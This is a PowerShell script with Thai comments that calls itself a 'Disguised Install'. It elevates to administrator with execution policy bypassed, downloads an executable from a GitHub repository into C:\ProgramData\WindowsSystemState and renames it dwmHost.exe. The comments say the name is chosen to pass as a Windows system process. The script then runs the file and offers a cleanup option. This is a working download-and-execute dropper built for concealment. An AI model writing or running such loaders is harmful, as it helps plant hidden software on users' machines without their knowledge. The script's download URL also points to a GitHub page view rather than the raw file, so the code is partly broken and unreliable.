# Menu Selection
Write-Host "+ Program Installer & Runner (Disguised Install)"
Write-Host "1. Install & Run"
Write-Host "2. Clean"

$choice = Read-Host "Enter choice (1/2)"

# Check for Administrator rights
# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
# *ต้องใช้สิทธิ์ Admin เพื่อติดตั้งไฟล์ใน C:\ProgramData*
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Restarting with administrator privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
    exit
}

# Define paths and variables
# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
# **ตำแหน่งติดตั้งที่ซ่อนตัว: C:\ProgramData\WindowsSystemState**
$InstallPath = Join-Path $env:ProgramData "WindowsSystemState"
# **ชื่อไฟล์ปลายทาง: dwmHost.exe (ปลอมตัวเป็น Process ระบบ)**
$SexeDestination = Join-Path $InstallPath "dwmHost.exe" 

# URL ดาวน์โหลด Raw file จาก GitHub (ของคุณ)
$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 

# Install & Run Mode
# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
if ($choice -eq "1") {
    Write-Host "`nStarting installation..."

    # สร้างโฟลเดอร์ติดตั้งถ้ายังไม่มี
    Write-Host "Checking/Creating installation folder in ProgramData..."
    if (-not (Test-Path $InstallPath)) {
        New-Item -Path $InstallPath -Type Directory | Out-Null
        Write-Host "Created folder: $InstallPath" -ForegroundColor Cyan
    }

    # Download exe 
    Write-Host "Downloading and installing executable..."
    try {
        $tempfile = Join-Path $env:TEMP "temp_download.exe"
        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
        # ย้ายไฟล์ที่ดาวน์โหลดมาไปยัง ProgramData โดยใช้ชื่อ dwmHost.exe
        Move-Item -Path $tempfile -Destination $SexeDestination -Force
        Write-Host "Executable download completed." -ForegroundColor Green
    } catch {
        Write-Host "Executable download failed: $." -ForegroundColor Red
        exit
    }

    # Run the program directly
    Write-Host "Starting the program..."
    try {
        # รันโปรแกรมโดยตรง (ไม่ต้องใช้ -Verb RunAs เพื่อลดปัญหาการรัน)
        Start-Process -FilePath $SexeDestination
        Write-Host "Program started successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to start program: $." -ForegroundColor Red
    }
    Write-Host "`nInstallation completed successfully." -ForegroundColor Green

# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
# Clean Mode
# ----------------------------------------------------------------------------------------------------------------------------------------------------------------
} elseif ($choice -eq "2") {
    Write-Host "Cleanup installation..."

    # Stop the process if running (ใช้ชื่อ dwmHost)
    Write-Host "Stopping dwmHost process..."
    try {
        Stop-Process -Name "dwmHost" -Force -ErrorAction SilentlyContinue
        Write-Host "Process stopped." -ForegroundColor Green
    } catch {
        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
    }

    # Remove files and folder
    if (Test-Path $SexeDestination) {
        Remove-Item $SexeDestination -Force
        Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
    }
    
    # ลบโฟลเดอร์ที่สร้างขึ้นด้วย
    if (Test-Path $InstallPath) {
        Remove-Item $InstallPath -Recurse -Force
        Write-Host "Removed installation folder: $InstallPath" -ForegroundColor Green
    }

    Write-Host "Cleanup completed." -ForegroundColor Green

} else {
    Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
}
